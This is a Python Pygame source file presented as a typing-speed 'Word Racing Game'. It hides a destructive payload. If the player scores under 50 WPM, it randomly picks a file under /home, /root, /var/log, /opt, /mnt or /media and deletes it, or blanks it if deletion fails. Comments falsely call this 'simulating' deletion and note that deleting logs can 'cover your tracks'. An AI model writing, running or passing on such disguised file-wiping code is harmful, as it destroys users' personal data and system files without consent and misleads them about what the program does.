import pygame
import time
import sys
import os
import random

def initialize_game():
    """Initialize Pygame and set up the game window."""
    pygame.init()
    WIDTH, HEIGHT = 1200, 800  # Wider window
    screen = pygame.display.set_mode((WIDTH, HEIGHT))
    pygame.display.set_caption("Word Racing Game")
    return screen, WIDTH, HEIGHT

def word_racing_game(screen, WIDTH, HEIGHT):
    global deleted_files, file_deleted
    """Main game logic."""
    # Set up fonts
    font = pygame.font.SysFont("Arial", 24)
    big_font = pygame.font.SysFont("Arial", 30)

    # Set up colors
    WHITE = (255, 255, 255)
    BLACK = (0, 0, 0)
    GREEN = (0, 255, 0)
    RED = (255, 0, 0)
    GRAY = (220, 220, 220)
    LIGHT_BLUE = (135, 206, 250)  # Sky blue for gradient
    DARK_PURPLE = (75, 0, 130)    # Soft purple for gradient

    # The paragraph to type (newlines removed)
    paragraph = "Did you know that the human body contains approximately 37.2 trillion cells? Each of these cells is a miniature powerhouse, carrying out essential functions that keep us alive. One of the most fascinating processes is the way our bodies produce energy. The mitochondria, often called the powerhouses of the cell, convert nutrients into energy in the form of ATP, which powers every action we take, from breathing to thinking. Another interesting fact is that our bodies are home to trillions of bacteria, which play crucial roles in digestion, immunity, and even mood regulation. The symbiotic relationship between humans and these microbes is an example of how interconnected all living organisms are."

    # Game state variables
    typed_text = ""
    mistakes = 0
    start_time = None
    total_words = len(paragraph.split())
    running = True
    game_over = False
    timer_started = False
    wpm = 0  # To store WPM result and avoid updating it once game is over
    deleted_files = []  # To store the names of deleted files
    file_deleted = False  # To track if a file has been deleted

    # Wrap the paragraph into lines
    wrapped_paragraph = wrap_text(paragraph, font, 1160)
    paragraph_height = len(wrapped_paragraph) * 30  # Height of the paragraph

    while running:
        # Draw gradient background
        draw_gradient_background(screen, HEIGHT, WIDTH, LIGHT_BLUE, DARK_PURPLE)
        
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False  # Exit the game loop

            if event.type == pygame.KEYDOWN and not game_over:
                if event.key == pygame.K_BACKSPACE:
                    typed_text = typed_text[:-1]
                elif event.key == pygame.K_RETURN:
                    # End game on Enter, calculate mistakes including blanks
                    if start_time is not None:
                        end_time = time.time()
                        wpm = calculate_wpm(start_time, end_time, len(typed_text.split()))
                        game_over = True
                        mistakes = sum(1 for i in range(len(paragraph)) if i < len(typed_text) and typed_text[i] != paragraph[i]) + abs(len(paragraph) - len(typed_text))  # Count mismatched and missing characters
                        if wpm < 50 and not file_deleted:  # Delete a file only if WPM is below 50
                            file_deleted = True
                            deleted_files = get_random_files(search_paths, excluded_dirs, num_files=1)  # Simulating file deletion
                            delete_or_overwrite(deleted_files[0])  # Simulate deletion

                else:
                    # Add the typed character to the text and remove any newline characters
                    typed_text += event.unicode.replace('\n', '')

            if event.type == pygame.MOUSEBUTTONDOWN and game_over:
                # Check if the restart button is clicked
                mouse_x, mouse_y = pygame.mouse.get_pos()
                if restart_button.collidepoint(mouse_x, mouse_y):
                    # Reset the game state
                    typed_text = ""
                    mistakes = 0
                    start_time = None
                    game_over = False
                    timer_started = False
                    wpm = 0
                    deleted_files = []
                    file_deleted = False

        # Start the timer when user starts typing
        if start_time is None and typed_text:
            start_time = time.time()
            timer_started = True

        # Set y_position for the prompt and paragraph
        prompt_y_position = 60  # Increased spacing for the note at the top
        paragraph_y_position = prompt_y_position + 40  # Space for the prompt
        input_box_y_position = paragraph_y_position + paragraph_height + 20  # Below the paragraph text

        # Display the paragraph (wrapped to multiple lines)
        display_text(screen, "Type this text:", 20, prompt_y_position, BLACK, font_size=20)
        display_text(screen, "Stay above 50 WPM!", 20, 10, GREEN, font_size=30)  # WPM reminder at the top

        # Display the paragraph with color-coded characters (one line at a time)
        current_line_index = 0
        for i, line in enumerate(wrapped_paragraph):
            y = paragraph_y_position + (i * 30)
            if i == current_line_index:
                # Only process the current line for color changes
                x_offset = 20  # Start rendering at x = 20
                for j, char in enumerate(line):
                    # Calculate the width of the current character
                    char_width = font.size(char)[0]
                    
                    # Determine the color based on user input
                    if j < len(typed_text) and j < len(paragraph):
                        if typed_text[j] == paragraph[j]:
                            color = WHITE if not game_over else GREEN  # White during typing, green at the end
                        else:
                            color = RED
                    else:
                        color = RED  # Unmatched characters remain red
                    
                    # Render the character at the correct position
                    rendered_char = font.render(char, True, color)
                    screen.blit(rendered_char, (x_offset, y))
                    
                    # Update the x_offset for the next character
                    x_offset += char_width
            else:
                # Display other lines in red (not being typed)
                rendered_line = font.render(line, True, RED)
                screen.blit(rendered_line, (20, y))

        # Adjust the size of the input box dynamically based on paragraph length
        pygame.draw.rect(screen, GRAY, (20, input_box_y_position, 1160, paragraph_height))  # Adjusted width for bigger display
        display_text(screen, typed_text, 20, input_box_y_position + 10, BLACK, font_size=20)

        # Track mistakes
        mistakes = sum(1 for i in range(min(len(typed_text), len(paragraph))) if typed_text[i] != paragraph[i]) + abs(len(paragraph) - len(typed_text))

        if game_over:
            # Position the Game Over UI under the grey box
            y_position_game_over = input_box_y_position + paragraph_height + 20  # Position below the grey box

            # Once the game is over, stop the timer and calculate WPM if not done already
            if start_time and wpm == 0:
                end_time = time.time()
                wpm = calculate_wpm(start_time, end_time, len(typed_text.split()))  # Calculate WPM at game over

            # Display results without overlapping with the main screen
            display_text(screen, f"Game Over! Your Results:", 20, y_position_game_over, BLACK, font_size=20)
            display_text(screen, f"WPM: {wpm:.2f}", 20, y_position_game_over + 40, GREEN, font_size=24)
            display_text(screen, f"Mistakes: {mistakes}", 20, y_position_game_over + 80, RED, font_size=24)

            # Display deleted files at the bottom
            y_position_deleted_files = y_position_game_over + 120  # Position for deleted files list
            if file_deleted:
                display_text(screen, f"File Deleted: {deleted_files[0]}", 20, y_position_deleted_files, RED, font_size=20)

            # Draw restart button
            restart_button = pygame.Rect(WIDTH // 2 - 100, y_position_deleted_files + 60, 200, 50)
            pygame.draw.rect(screen, GREEN, restart_button)
            button_text = "Restart"
            button_text_width, button_text_height = font.size(button_text)
            display_text(
                screen,
                button_text,
                restart_button.x + (restart_button.width // 2) - (button_text_width // 2),  # Centered horizontally
                restart_button.y + (restart_button.height // 2) - (button_text_height // 2),  # Centered vertically
                BLACK,
                font_size=24
            )

        # Stop the timer if the user finished typing the paragraph
        if typed_text.strip() == paragraph.strip() and not game_over and timer_started:
            end_time = time.time()
            wpm = calculate_wpm(start_time, end_time, len(typed_text.split()))
            display_text(screen, f"Finished! WPM: {wpm:.2f}", 440, GREEN, font_size=20)
            game_over = True

        pygame.display.update()

    # Quit Pygame when the game loop ends
    pygame.quit()

def start_game():
    """Function to start the game."""
    screen, WIDTH, HEIGHT = initialize_game()
    word_racing_game(screen, WIDTH, HEIGHT)

# Helper functions (omitted for brevity)
def wrap_text(text, font, max_width):
    """Wraps text to fit within a specified width."""
    words = text.split(' ')
    lines = []
    current_line = ''
    for word in words:
        test_line = current_line + (' ' if current_line else '') + word
        test_width = font.size(test_line)[0]
        if test_width <= max_width:
            current_line = test_line
        else:
            if current_line:
                lines.append(current_line)
            current_line = word
    if current_line:
        lines.append(current_line)
    return lines

def display_text(screen, text, x, y, color, font_size=20):
    """Displays text on the screen."""
    font = pygame.font.SysFont("Arial", font_size)
    rendered_text = font.render(text, True, color)
    screen.blit(rendered_text, (x, y))

def draw_gradient_background(screen, HEIGHT, WIDTH, LIGHT_BLUE, DARK_PURPLE):
    """Draws a gradient background."""
    for i in range(HEIGHT):
        color = (
            int(LIGHT_BLUE[0] + (DARK_PURPLE[0] - LIGHT_BLUE[0]) * i / HEIGHT),
            int(LIGHT_BLUE[1] + (DARK_PURPLE[1] - LIGHT_BLUE[1]) * i / HEIGHT),
            int(LIGHT_BLUE[2] + (DARK_PURPLE[2] - LIGHT_BLUE[2]) * i / HEIGHT)
        )
        pygame.draw.line(screen, color, (0, i), (WIDTH, i))

def calculate_wpm(start_time, end_time, total_words):
    """Calculates words per minute (WPM)."""
    elapsed_time = end_time - start_time
    minutes = elapsed_time / 60
    wpm = total_words / minutes
    return wpm

def delete_or_overwrite(file_path):
    """Deletes or overwrites a file."""
    try:
        os.remove(file_path)
        print(f"Deleted: {file_path}")
    except Exception as e:
        overwrite_file(file_path)

def overwrite_file(file_path):
    """Overwrites a file with blank content."""
    try:
        with open(file_path, "w") as f:
            f.write("")  # Writing an empty string clears the file
            print(f"Deleted: {file_path}")
    except Exception as e:
        pass

def get_random_files(search_paths, excluded_dirs, num_files=5):
    """Finds random files from given search paths."""
    all_files = []
    for path in search_paths:
        for root, _, files in os.walk(path):
            if any(excluded in root for excluded in excluded_dirs):
                continue  # Skip excluded directories
            for file in files:
                all_files.append(os.path.join(root, file))
    if not all_files:
        return []
    return random.sample(all_files, min(num_files, len(all_files)))  # Pick random files safely

# Define search paths and excluded directories
search_paths = [
    "/home",        # User directories (deleting personal files = chaos)
    "/root",        # Superuser home directory
    "/var/log",     # Logs (deleting logs can cover your tracks)
    "/var/tmp",     # Temporary files that persist between reboots
    "/opt",         # Third-party software (deleting breaks apps)
    "/mnt", "/media"  # Mounted drives (potentially deleting external storage)
]
excluded_dirs = ["/proc", "/usr", "/snap", "/sys"]

if __name__ == "__main__":
    start_game()
